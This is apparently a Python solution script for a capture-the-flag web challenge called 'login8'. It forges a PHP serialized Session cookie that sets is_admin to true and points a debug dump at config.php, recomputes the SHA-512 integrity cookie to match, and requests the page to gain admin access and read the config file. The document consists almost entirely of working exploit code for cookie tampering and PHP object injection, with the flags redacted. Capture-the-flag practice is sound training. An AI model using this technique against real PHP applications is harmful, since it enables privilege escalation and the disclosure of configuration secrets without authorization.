import requests
import urllib.parse
import hashlib
url = "https://ctf.hackme.quest/login8/"

ooo = "O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A1%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A10%3A%22config.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A2%3A%7Bs%3A8%3A%22password%22%3Bs%3A5%3A%22guest%22%3Bs%3A5%3A%22admin%22%3Bb%3A0%3B%7Ds%3A4%3A%22user%22%3Bs%3A5%3A%22guest%22%3Bs%3A4%3A%22pass%22%3Bs%3A5%3A%22guest%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A1%3B%7D"

# change the cookie is_admin to 1

cookies = {"login8cookie": ooo, "login8sha512": hashlib.sha512(urllib.parse.unquote(ooo).encode()).hexdigest()}
print(urllib.parse.unquote(ooo))
print(cookies)

r = requests.get(url, cookies=cookies)

print(r.text)

# FLAG{???}

# change the cookie debug to 1 and modify debug path to config.php

r = requests.get(url+"?debug=1", cookies=cookies)

print(r.text)

# FLAG{???}